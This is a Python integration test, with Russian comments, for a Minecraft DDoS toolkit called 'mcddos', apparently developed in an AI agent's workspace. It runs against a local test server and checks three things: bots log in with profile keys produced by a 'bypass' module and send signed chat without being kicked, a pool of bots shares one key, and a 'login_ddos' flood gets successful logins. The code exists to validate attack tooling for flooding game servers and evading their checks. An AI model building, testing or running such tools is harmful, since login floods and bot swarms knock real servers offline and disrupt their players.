"""Интеграция: боты с profile_key (signed chat) против живого tsrv.js (1.21.1, pvn 767).

1. MCConn.login() с profile_key -> play, chat_session_update уходит
2. MCConn.chat() signed -> сервер принимает (не кикает)
3. BotPool signed=True, share_key=True -> 3 бота заходят, чатят
4. login_ddos signed=True -> несколько успешных logins
"""
import asyncio, os, sys, time, struct

sys.path.insert(0, '/home/agent/work/gh-minecraft-ddos')
os.chdir('/home/agent/work/gh-minecraft-ddos')
from mcddos import mcconn, bypass, ddos
from mcddos import bots as bots_mod

HOST, PORT, VER = '127.0.0.1', 25575, '1.21.1'
PASS, FAIL = 0, 0

def check(name, cond, extra=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  [PASS] {name} {extra}")
    else:
        FAIL += 1
        print(f"  [FAIL] {name} {extra}")

async def t1_login_chat():
    print("\n== T1: одиночный MCConn, profile_key, signed chat ==")
    pk = await asyncio.get_running_loop().run_in_executor(
        None, bypass.make_profile_key, "SoloBot1", True)
    c = mcconn.MCConn(HOST, PORT, username="SoloBot1",
                      profile_key=pk, offline_uuid=True)
    ok = await c.login(VER, wait_play=True, timeout=15)
    check("login -> play", ok, f"kick={c.kick_reason}")
    if not ok:
        await c.close(); return
    check("player_uuid получен", c.player_uuid is not None)
    # signed chat
    ok = await c.chat("signed hello from solo")
    check("signed chat ok", ok)
    await asyncio.sleep(1.5)
    check("после чата не кикнули", c.state == "play")
    # второй signed chat (индекс инкрементится)
    ok2 = await c.chat("second signed msg")
    check("второй signed chat ok", ok2)
    await c.close()

async def t2_pool():
    print("\n== T2: BotPool 3 бота, signed, общий ключ ==")
    t0 = time.time()
    pk0 = bypass.get_shared_key()  # прогрев кэша (один на волну)
    pool = bots_mod.BotPool(HOST, PORT, VER, count=3, signed=True,
                            share_key=True, offline_uuid=True)
    pool.spawn(3)
    pool.start_all()
    deadline = time.time() + 40
    while time.time() < deadline:
        s = pool.stats()
        if s["joined"] == 3:
            break
        await asyncio.sleep(0.5)
    await asyncio.sleep(12)  # время на чаты (chat_every=8, первый ~1-8s)
    s = pool.stats()
    check("3/3 joined", s["joined"] == 3, f"stats={s} t={time.time()-t0:.0f}s")
    check("есть chats", s["chats"] >= 2, f"chats={s['chats']}")
    check("нет киков", s["kicks"] == 0, f"kicks={s['kicks']}")
    names = {b.username: b.profile_key is not None for b in pool.bots}
    check("у всех ботов profile_key", all(names.values()), str(names))
    # общий ключ на волну (тот же _RSACtx => тот же n)
    shared = all(b.profile_key is not None and b.profile_key.rsa.n == pk0.n
                 for b in pool.bots)
    check("ключ общий (share_key)", shared)
    await pool.stop_all()

async def t3_login_flood():
    print("\n== T3: login_ddos signed=True (12 логиров) ==")
    stats = ddos.Stats()
    stop = {"f": False}
    task = asyncio.create_task(
        ddos.login_ddos(HOST, PORT, VER, workers=4, stop=lambda: stop["f"],
                        stats=stats, signed=True, share_key=True))
    await asyncio.sleep(25)
    stop["f"] = True
    try:
        await asyncio.wait_for(task, 15)
    except Exception:
        pass
    task.cancel()
    check("login flood: ok>0", stats.ok > 0, f"ok={stats.ok} fail={stats.fail}")
    check("login flood: большинство ok", stats.ok >= stats.fail,
          f"ok={stats.ok} fail={stats.fail}")

async def main():
    await t1_login_chat()
    await t2_pool()
    await t3_login_flood()
    print(f"\n==== INTEGRATION: {PASS} passed, {FAIL} failed ====")
    return 1 if FAIL else 0

if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
